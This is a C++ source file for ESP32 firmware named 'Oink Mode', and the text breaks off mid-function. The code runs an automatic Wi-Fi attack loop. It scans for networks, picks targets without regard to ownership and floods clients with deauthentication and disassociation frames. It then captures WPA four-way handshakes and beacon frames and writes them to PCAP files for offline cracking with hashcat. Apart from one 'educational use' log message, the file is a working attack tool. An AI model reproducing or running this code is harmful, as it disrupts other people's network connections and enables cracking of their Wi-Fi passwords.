// Oink Mode implementation

#include "oink.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../ml/inference.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <SD.h>
#include <algorithm>

// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
std::vector<DetectedNetwork> OinkMode::networks;
std::vector<CapturedHandshake> OinkMode::handshakes;
int OinkMode::targetIndex = -1;
uint8_t OinkMode::targetBssid[6] = {0};
int OinkMode::selectionIndex = 0;
uint32_t OinkMode::packetCount = 0;
uint32_t OinkMode::deauthCount = 0;

// Beacon frame storage for PCAP (required for hashcat)
uint8_t* OinkMode::beaconFrame = nullptr;
uint16_t OinkMode::beaconFrameLen = 0;
bool OinkMode::beaconCaptured = false;

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

// Deauth timing
static uint32_t lastDeauthTime = 0;
static uint32_t lastMoodUpdate = 0;

// Auto-attack state machine (like M5Gotchi)
enum class AutoState {
    SCANNING,       // Scanning for networks
    LOCKING,        // Locked to target channel, discovering clients
    ATTACKING,      // Deauthing + sniffing target
    WAITING,        // Delay between attacks
    NEXT_TARGET     // Move to next target
};
static AutoState autoState = AutoState::SCANNING;
static uint32_t stateStartTime = 0;
static uint32_t attackStartTime = 0;
static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
static const uint32_t LOCK_TIME = 3000;         // 3 sec to discover clients before attacking
static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
static const uint32_t WAIT_TIME = 2000;         // 2 sec between targets

void OinkMode::init() {
    networks.clear();
    handshakes.clear();
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    selectionIndex = 0;
    packetCount = 0;
    deauthCount = 0;
    currentHopIndex = 0;
    
    // Reset state machine
    autoState = AutoState::SCANNING;
    stateStartTime = 0;
    attackStartTime = 0;
    lastDeauthTime = 0;
    lastMoodUpdate = 0;
    
    // Clear beacon frame if any
    if (beaconFrame) {
        free(beaconFrame);
        beaconFrame = nullptr;
    }
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    Serial.println("[OINK] Initialized");
}

void OinkMode::start() {
    if (running) return;
    
    Serial.println("[OINK] Starting auto-attack mode (like M5Gotchi)...");
    
    // Initialize WSL bypasser for deauth frame injection
    WSLBypasser::init();
    
    // Initialize WiFi in promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);  // Give WiFi time to settle
    
    // Set callback BEFORE enabling promiscuous mode
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous_filter(nullptr);  // Receive all packet types
    esp_wifi_set_promiscuous(true);
    
    // Set channel
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    running = true;
    scanning = true;
    channelHopping = true;
    lastHopTime = millis();
    lastScanTime = millis();
    
    // Initialize auto-attack state machine
    autoState = AutoState::SCANNING;
    stateStartTime = millis();
    selectionIndex = 0;
    
    Mood::setStatusMessage("Scanning for targets...");
    Display::setWiFiStatus(true);
    Serial.println("[OINK] Auto-attack running");
}

void OinkMode::stop() {
    if (!running) return;
    
    Serial.println("[OINK] Stopping...");
    
    deauthing = false;
    scanning = false;
    
    esp_wifi_set_promiscuous(false);
    
    // Free beacon frame
    if (beaconFrame) {
        free(beaconFrame);
        beaconFrame = nullptr;
    }
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    running = false;
    Display::setWiFiStatus(false);
    
    Serial.println("[OINK] Stopped");
}

void OinkMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // Auto-attack state machine (like M5Gotchi)
    switch (autoState) {
        case AutoState::SCANNING:
            // Channel hopping during scan
            if (now - lastHopTime > Config::wifi().channelHopInterval) {
                hopChannel();
                lastHopTime = now;
            }
            
            // Update mood
            if (now - lastMoodUpdate > 3000) {
                Mood::onSniffing(networks.size(), currentChannel);
                lastMoodUpdate = now;
            }
            
            // After scan time, sort and pick target
            if (now - stateStartTime > SCAN_TIME && !networks.empty()) {
                sortNetworksByPriority();
                autoState = AutoState::NEXT_TARGET;
                Serial.println("[OINK] Scan complete, starting auto-attack");
            }
            break;
            
        case AutoState::NEXT_TARGET:
            {
                // Use smart target selection
                int nextIdx = getNextTarget();
                
                if (nextIdx < 0) {
                    // No suitable targets, rescan
                    autoState = AutoState::SCANNING;
                    stateStartTime = now;
                    channelHopping = true;
                    deauthing = false;
                    Mood::setStatusMessage("Rescanning...");
                    Serial.println("[OINK] No targets available, rescanning");
                    break;
                }
                
                selectionIndex = nextIdx;
                
                // Select this target (locks to channel, stops hopping)
                selectTarget(selectionIndex);
                networks[selectionIndex].attackAttempts++;
                
                // Go to LOCKING state to discover clients before attacking
                autoState = AutoState::LOCKING;
                stateStartTime = now;
                deauthing = false;  // Don't deauth yet, just listen
                
                Serial.printf("[OINK] Locking to %s (ch%d) - discovering clients...\n", 
                             networks[selectionIndex].ssid,
                             networks[selectionIndex].channel);
                Mood::setStatusMessage("Sniffing clients...");
            }
            break;
            
        case AutoState::LOCKING:
            // Wait on target channel to discover clients via data frames
            // This is crucial - targeted deauth is much more effective
            if (now - stateStartTime > LOCK_TIME) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    DetectedNetwork* target = &networks[targetIndex];
                    
                    Serial.printf("[OINK] Starting attack on %s (%d clients found, attempt #%d)\n",
                                 target->ssid, target->clientCount, target->attackAttempts);
                    
                    if (target->clientCount == 0) {
                        Serial.println("[OINK] WARNING: No clients found - broadcast deauth only (less effective)");
                    }
                    
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                }
            }
            break;
            
        case AutoState::ATTACKING:
            // Send deauth burst every 100ms (more effective than single packets)
            if (now - lastDeauthTime > 100) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    DetectedNetwork* target = &networks[targetIndex];
                    
                    // Skip if PMF (shouldn't happen but safety check)
                    if (target->hasPMF) {
                        selectionIndex++;
                        autoState = AutoState::NEXT_TARGET;
                        break;
                    }
                    
                    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    
                    // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
                    // Targeted deauth is much more reliable than broadcast
                    if (target->clientCount > 0) {
                        for (int c = 0; c < target->clientCount && c < MAX_CLIENTS_PER_NETWORK; c++) {
                            // Send more targeted deauths - these actually work
                            sendDeauthBurst(target->bssid, target->clients[c].mac, 5);
                            deauthCount += 5;
                            
                            // Also disassoc targeted client
                            sendDisassocFrame(target->bssid, target->clients[c].mac, 8);
                        }
                    }
                    
                    // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
                    // Only send 1 broadcast per cycle to reduce noise
                    sendDeauthFrame(target->bssid, broadcast, 7);
                    deauthCount++;
                    
                    lastDeauthTime = now;
                }
            }
            
            // Update mood with attack progress
            if (now - lastMoodUpdate > 2000) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    DetectedNetwork* target = &networks[targetIndex];
                    Mood::onDeauthing(target->ssid, deauthCount);
                    
                    // Log attack status including client count
                    Serial.printf("[OINK] Attacking %s: %d deauths, %d clients tracked\n",
                                 target->ssid, deauthCount, target->clientCount);
                }
                lastMoodUpdate = now;
            }
            
            // Check if handshake captured for this target
            for (const auto& hs : handshakes) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    if (memcmp(hs.bssid, networks[targetIndex].bssid, 6) == 0 && hs.isComplete()) {
                        // Got handshake! Mark network and move to next
                        networks[targetIndex].hasHandshake = true;
                        Serial.printf("[OINK] Handshake captured for %s!\n", networks[targetIndex].ssid);
                        autoState = AutoState::WAITING;
                        stateStartTime = now;
                        deauthing = false;
                        break;
                    }
                }
            }
            
            // Timeout - move to next target
            if (now - attackStartTime > ATTACK_TIMEOUT) {
                Serial.printf("[OINK] Timeout on %s, moving to next\n", 
                    (targetIndex >= 0 && targetIndex < (int)networks.size()) ? networks[targetIndex].ssid : "?");
                autoState = AutoState::WAITING;
                stateStartTime = now;
                deauthing = false;
            }
            break;
            
        case AutoState::WAITING:
            // Brief pause between attacks
            if (now - stateStartTime > WAIT_TIME) {
                autoState = AutoState::NEXT_TARGET;
            }
            break;
    }
    
    // Periodic network cleanup - remove stale entries
    if (now - lastScanTime > 30000) {
        for (auto it = networks.begin(); it != networks.end();) {
            if (now - it->lastSeen > 60000) {
                it = networks.erase(it);
            } else {
                ++it;
            }
        }
        // Revalidate targetIndex after cleanup using stored BSSID
        if (targetIndex >= 0) {
            targetIndex = findNetwork(targetBssid);
            if (targetIndex < 0) {
                // Target was removed, clear it
                deauthing = false;
                channelHopping = true;
                memset(targetBssid, 0, 6);
                Serial.println("[OINK] Target network expired");
            }
        }
        lastScanTime = now;
    }
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
    Serial.println("[OINK] Scan started");
}

void OinkMode::stopScan() {
    scanning = false;
    Serial.println("[OINK] Scan stopped");
}

void OinkMode::selectTarget(int index) {
    if (index >= 0 && index < (int)networks.size()) {
        targetIndex = index;
        memcpy(targetBssid, networks[index].bssid, 6);  // Store BSSID
        networks[index].isTarget = true;
        
        // Clear old beacon frame when target changes
        if (beaconFrame) {
            free(beaconFrame);
            beaconFrame = nullptr;
        }
        beaconFrameLen = 0;
        beaconCaptured = false;
        
        // Lock to target's channel
        channelHopping = false;
        setChannel(networks[index].channel);
        
        // Auto-start deauth when target selected
        deauthing = true;
        
        Serial.printf("[OINK] Target selected: %s - Deauth auto-started\n", networks[index].ssid);
    }
}

void OinkMode::clearTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        networks[targetIndex].isTarget = false;
    }
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    deauthing = false;
    channelHopping = true;
    Serial.println("[OINK] Target cleared, deauth stopped");
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        return &networks[targetIndex];
    }
    return nullptr;
}

void OinkMode::moveSelectionUp() {
    if (networks.empty()) return;
    selectionIndex--;
    if (selectionIndex < 0) selectionIndex = networks.size() - 1;
}

void OinkMode::moveSelectionDown() {
    if (networks.empty()) return;
    selectionIndex++;
    if (selectionIndex >= (int)networks.size()) selectionIndex = 0;
}

void OinkMode::confirmSelection() {
    if (networks.empty()) return;
    if (selectionIndex >= 0 && selectionIndex < (int)networks.size()) {
        selectTarget(selectionIndex);
    }
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
    Serial.println("[OINK] Deauth started (EDUCATIONAL USE ONLY)");
}

void OinkMode::stopDeauth() {
    deauthing = false;
    Serial.println("[OINK] Deauth stopped");
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    currentHopIndex = (currentHopIndex + 1) % CHANNEL_COUNT;
    currentChannel = CHANNEL_HOP_ORDER[currentHopIndex];
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void IRAM_ATTR OinkMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!running) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    // ESP32 adds 4 ghost bytes to sig_len
    if (len > 4) len -= 4;
    
    if (len < 24) return;  // Minimum 802.11 header
    
    packetCount++;
    
    const uint8_t* payload = pkt->payload;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    
    switch (type) {
        case WIFI_PKT_MGMT:
            if (frameSubtype == 0x08) {  // Beacon
                processBeacon(payload, len, rssi);
            } else if (frameSubtype == 0x05) {  // Probe Response
                processProbeResponse(payload, len, rssi);
            }
            break;
            
        case WIFI_PKT_DATA:
            processDataFrame(payload, len, rssi);
            break;
            
        default:
            break;
    }
    // Deauth moved to update() for reliable timing
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 36) return;
    
    // BSSID is at offset 16
    const uint8_t* bssid = payload + 16;
    
    // Detect PMF before anything else
    bool hasPMF = detectPMF(payload, len);
    
    // Capture beacon for target AP (needed for PCAP/hashcat)
    if (targetIndex >= 0 && targetIndex < (int)networks.size() && !beaconCaptured) {
        DetectedNetwork* target = &networks[targetIndex];
        if (memcmp(bssid, target->bssid, 6) == 0) {
            // Allocate and copy beacon frame
            beaconFrame = (uint8_t*)malloc(len);
            if (beaconFrame) {
                memcpy(beaconFrame, payload, len);
                beaconFrameLen = len;
                beaconCaptured = true;
                Serial.printf("[OINK] Beacon captured for %s (%d bytes)\n", target->ssid, len);
            }
        }
    }
    
    int idx = findNetwork(bssid);
    
    if (idx < 0) {
        // New network
        DetectedNetwork net = {0};
        memcpy(net.bssid, bssid, 6);
        net.rssi = rssi;
        net.lastSeen = millis();
        net.beaconCount = 1;
        net.isTarget = false;
        net.hasPMF = hasPMF;
        net.hasHandshake = false;
        net.attackAttempts = 0;
        net.isHidden = false;
        net.clientCount = 0;
        
        // Parse SSID from IE
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0) {
                if (ieLen > 0 && ieLen < 33) {
                    memcpy(net.ssid, payload + offset + 2, ieLen);
                    net.ssid[ieLen] = 0;
                } else {
                    // Hidden network (zero-length SSID)
                    net.isHidden = true;
                }
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        // Check if we already have a handshake for this network
        net.hasHandshake = hasHandshakeFor(bssid);
        
        // Extract features for ML
        net.features = FeatureExtractor::extractFromBeacon(payload, len, rssi);
        
        // Get channel from DS Parameter Set IE
        offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (id == 3 && ieLen == 1) {  // DS Parameter Set
                net.channel = payload[offset + 2];
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        // Parse auth mode from RSN (0x30) and WPA (0xDD) IEs
        net.authmode = WIFI_AUTH_OPEN;  // Default to open
        offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0x30 && ieLen >= 2) {  // RSN IE = WPA2/WPA3
                // Check for WPA3 (SAE in AKM suite)
                // For simplicity, assume RSN = WPA2, PMF = WPA3
                if (net.hasPMF) {
                    net.authmode = WIFI_AUTH_WPA3_PSK;
                } else {
                    net.authmode = WIFI_AUTH_WPA2_PSK;
                }
            } else if (id == 0xDD && ieLen >= 8) {  // Vendor specific
                // Check for WPA1 OUI: 00:50:F2:01
                if (payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 &&
                    payload[offset + 4] == 0xF2 && payload[offset + 5] == 0x01) {
                    // WPA1 - only set if not already WPA2
                    if (net.authmode == WIFI_AUTH_OPEN) {
                        net.authmode = WIFI_AUTH_WPA_PSK;
                    } else if (net.authmode == WIFI_AUTH_WPA2_PSK) {
                        net.authmode = WIFI_AUTH_WPA_WPA2_PSK;
                    }
                }
            }
            
            offset += 2 + ieLen;
        }
        
        if (net.channel == 0) {
            net.channel = currentChannel;
        }
        
        networks.push_back(net);
        Mood::onNewNetwork(net.ssid, net.rssi, net.channel);
        
        Serial.printf("[OINK] New network: %s (ch%d, %ddBm%s)\n", 
                     net.ssid[0] ? net.ssid : "<hidden>", net.channel, net.rssi,
                     net.hasPMF ? " PMF" : "");
    } else {
        // Update existing
        networks[idx].rssi = rssi;
        networks[idx].lastSeen = millis();
        networks[idx].beaconCount++;
        networks[idx].hasPMF = hasPMF;  // Update PMF status
    }
}

void OinkMode::processProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Probe responses reveal hidden SSIDs
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    int idx = findNetwork(bssid);
    if (idx < 0) return;  // Only update existing networks
    
    // If network has hidden SSID, try to extract from probe response
    if (networks[idx].ssid[0] == 0 || networks[idx].isHidden) {
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen < 33) {
                memcpy(networks[idx].ssid, payload + offset + 2, ieLen);
                networks[idx].ssid[ieLen] = 0;
                networks[idx].isHidden = false;
                
                Serial.printf("[OINK] Hidden SSID revealed: %s\n", networks[idx].ssid);
                Mood::onNewNetwork(networks[idx].ssid, rssi, networks[idx].channel);
                break;
            }
            
            offset += 2 + ieLen;
        }
    }
    
    networks[idx].lastSeen = millis();
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Extract addresses based on ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    const uint8_t* bssid = nullptr;
    const uint8_t* clientMac = nullptr;
    
    // Address layout depends on ToDS/FromDS:
    // ToDS=0, FromDS=1: Addr1=DA(client), Addr2=BSSID, Addr3=SA
    // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
    if (!toDs && fromDs) {
        // From AP to client
        bssid = payload + 10;      // Addr2
        clientMac = payload + 4;   // Addr1 (destination = client)
    } else if (toDs && !fromDs) {
        // From client to AP
        bssid = payload + 4;       // Addr1
        clientMac = payload + 10;  // Addr2 (source = client)
    }
    
    // Track client if we identified both
    if (bssid && clientMac) {
        // Don't track broadcast/multicast
        if ((clientMac[0] & 0x01) == 0) {
            trackClient(bssid, clientMac, rssi);
        }
    }
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data frame (subtype has bit 3 set = 0x08, 0x09, etc.)
    // Frame control byte 0: bits 4-7 = subtype, bit 3 of subtype = QoS
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    if (subtype & 0x08) {
        offset += 2;  // QoS control field
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        // This is EAPOL!
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac) {
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) return;  // Only interested in EAPOL-Key
    
    if (len < 99) return;  // Minimum EAPOL-Key frame
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) messageNum = 1;
    else if (!keyAck && keyMic && !install) messageNum = 2;
    else if (keyAck && keyMic && install) messageNum = 3;
    else if (!keyAck && keyMic && secure) messageNum = 4;
    
    if (messageNum == 0) return;
    
    // Determine which is AP (sender of M1/M3) and station
    uint8_t bssid[6], station[6];
    if (messageNum == 1 || messageNum == 3) {
        memcpy(bssid, srcMac, 6);
        memcpy(station, dstMac, 6);
    } else {
        memcpy(bssid, dstMac, 6);
        memcpy(station, srcMac, 6);
    }
    
    // M1 = AP initiating handshake = client reconnected after deauth!
    // If we're deauthing this target, our deauth worked!
    if (messageNum == 1 && deauthing && targetIndex >= 0 && targetIndex < (int)networks.size()) {
        if (memcmp(bssid, networks[targetIndex].bssid, 6) == 0) {
            // Deauth success - client is reconnecting!
            Mood::onDeauthSuccess(station);
            Serial.printf("[OINK] Deauth confirmed! Client %02X:%02X:%02X:%02X:%02X:%02X reconnecting\n",
                         station[0], station[1], station[2], station[3], station[4], station[5]);
        }
    }
    
    // Find or create handshake entry
    int hsIdx = findOrCreateHandshake(bssid, station);
    if (hsIdx < 0) return;
    
    CapturedHandshake& hs = handshakes[hsIdx];
    
    // Store this frame
    uint8_t frameIdx = messageNum - 1;
    uint16_t copyLen = min((uint16_t)512, len);
    memcpy(hs.frames[frameIdx].data, payload, copyLen);
    hs.frames[frameIdx].len = copyLen;
    hs.frames[frameIdx].messageNum = messageNum;
    hs.frames[frameIdx].timestamp = millis();
    
    // Update mask
    hs.capturedMask |= (1 << frameIdx);
    hs.lastSeen = millis();
    
    // Look up SSID from networks if not set
    if (hs.ssid[0] == 0) {
        int netIdx = findNetwork(bssid);
        if (netIdx >= 0) {
            strncpy(hs.ssid, networks[netIdx].ssid, 32);
            hs.ssid[32] = 0;  // Ensure null termination
        }
    }
    
    Serial.printf("[OINK] EAPOL M%d captured! SSID:%s BSSID:%02X:%02X:%02X:%02X:%02X:%02X [%s%s%s%s]\n",
                 messageNum, 
                 hs.ssid[0] ? hs.ssid : "?",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                 hs.hasM1() ? "1" : "-",
                 hs.hasM2() ? "2" : "-",
                 hs.hasM3() ? "3" : "-",
                 hs.hasM4() ? "4" : "-");
    
    // Trigger mood on capture with AP name
    Mood::onHandshakeCaptured(hs.ssid);
    
    // Auto-save if we got a complete handshake
    if (hs.isComplete() && !hs.saved) {
        autoSaveCheck();
    }
}

int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
    // Look for existing handshake with same BSSID+station pair
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            return i;
        }
    }
    
    // Create new entry
    CapturedHandshake hs = {0};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.station, station, 6);
    hs.capturedMask = 0;
    hs.firstSeen = millis();
    hs.lastSeen = millis();
    hs.saved = false;
    
    handshakes.push_back(hs);
    return handshakes.size() - 1;
}

uint16_t OinkMode::getCompleteHandshakeCount() {
    uint16_t count = 0;
    for (const auto& hs : handshakes) {
        if (hs.isComplete()) count++;
    }
    return count;
}

void OinkMode::autoSaveCheck() {
    // Check if SD card is available
    if (!Config::isSDAvailable()) {
        return;
    }
    
    // Save any unsaved complete handshakes
    for (auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved) {
            // Generate filename
            char filename[64];
            snprintf(filename, sizeof(filename), "/handshakes/%02X%02X%02X%02X%02X%02X.pcap",
                    hs.bssid[0], hs.bssid[1], hs.bssid[2],
                    hs.bssid[3], hs.bssid[4], hs.bssid[5]);
            
            // Ensure directory exists
            if (!SD.exists("/handshakes")) {
                SD.mkdir("/handshakes");
            }
            
            if (saveHandshakePCAP(hs, filename)) {
                hs.saved = true;
                Serial.printf("[OINK] Handshake saved: %s\n", filename);
                
                // Save SSID to companion .txt file for later reference
                char txtFilename[64];
                snprintf(txtFilename, sizeof(txtFilename), "/handshakes/%02X%02X%02X%02X%02X%02X.txt",
                        hs.bssid[0], hs.bssid[1], hs.bssid[2],
                        hs.bssid[3], hs.bssid[4], hs.bssid[5]);
                File txtFile = SD.open(txtFilename, FILE_WRITE);
                if (txtFile) {
                    txtFile.println(hs.ssid);
                    txtFile.close();
                }
            }
        }
    }
}

// PCAP file format structures
#pragma pack(push, 1)
struct PCAPHeader {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PCAPPacketHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

void OinkMode::writePCAPHeader(fs::File& f) {
    PCAPHeader hdr = {
        .magic = 0xA1B2C3D4,      // PCAP magic
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .linktype = 105           // LINKTYPE_IEEE802_11 (802.11)
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

void OinkMode::writePCAPPacket(fs::File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
    PCAPPacketHeader pkt = {
        .ts_sec = ts / 1000,
        .ts_usec = (ts % 1000) * 1000,
        .incl_len = len,
        .orig_len = len
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    f.write(data, len);
}

bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        Serial.printf("[OINK] Failed to create PCAP: %s\n", path);
        return false;
    }
    
    writePCAPHeader(f);
    
    // Write beacon frame first (required for hashcat to crack)
    if (beaconCaptured && beaconFrame && beaconFrameLen > 0) {
        // Verify beacon is from same BSSID as handshake
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, hs.bssid, 6) == 0) {
            writePCAPPacket(f, beaconFrame, beaconFrameLen, hs.firstSeen);
            Serial.println("[OINK] Beacon written to PCAP");
        }
    }
    
    // Build 802.11 data frame + EAPOL for each captured message
    // We need to reconstruct the full frame for PCAP
    
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        
        const EAPOLFrame& frame = hs.frames[i];
        if (frame.len == 0) continue;
        
        // Build fake 802.11 Data frame header + LLC/SNAP + EAPOL
        uint8_t pkt[600];
        uint16_t pktLen = 0;
        
        // 802.11 Data frame header (24 bytes)
        // Frame Control: Type=Data(0x08), Flags in byte[1]
        // Byte[1] bits: ToDS=bit0, FromDS=bit1
        pkt[0] = 0x08;
        pkt[2] = 0x00; pkt[3] = 0x00;  // Duration
        
        // Addresses depend on message direction
        // IEEE 802.11 address fields:
        // ToDS=0, FromDS=1: Addr1=DA, Addr2=BSSID, Addr3=SA
        // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA, Addr3=DA
        if (i == 0 || i == 2) {  // M1, M3: AP->Station (FromDS=1, ToDS=0)
            pkt[1] = 0x02;  // FromDS=1, ToDS=0
            memcpy(pkt + 4, hs.station, 6);   // Addr1 = DA (destination = station)
            memcpy(pkt + 10, hs.bssid, 6);    // Addr2 = BSSID (source = AP)
            memcpy(pkt + 16, hs.bssid, 6);    // Addr3 = SA (source address)
        } else {  // M2, M4: Station->AP (ToDS=1, FromDS=0)
            pkt[1] = 0x01;  // ToDS=1, FromDS=0
            memcpy(pkt + 4, hs.bssid, 6);     // Addr1 = BSSID (receiver = AP)
            memcpy(pkt + 10, hs.station, 6);  // Addr2 = SA (transmitter = station)
            memcpy(pkt + 16, hs.bssid, 6);    // Addr3 = DA (destination = BSSID)
        }
        
        pkt[22] = 0x00; pkt[23] = 0x00;  // Sequence
        pktLen = 24;
        
        // LLC/SNAP header (8 bytes)
        pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
        pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
        pkt[30] = 0x88; pkt[31] = 0x8E;  // EAPOL ethertype
        pktLen = 32;
        
        // EAPOL data
        memcpy(pkt + 32, frame.data, frame.len);
        pktLen += frame.len;
        
        writePCAPPacket(f, pkt, pktLen, frame.timestamp);
    }
    
    f.close();
    return true;
}

bool OinkMode::saveAllHandshakes() {
    bool success = true;
    autoSaveCheck();  // This saves any unsaved ones
    return success;
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        // Address 1 (Destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Address 2 (Source/BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Address 3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence
        0x07, 0x00   // Reason code
    };
    
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    // Send burst of deauth frames for more effective disconnection
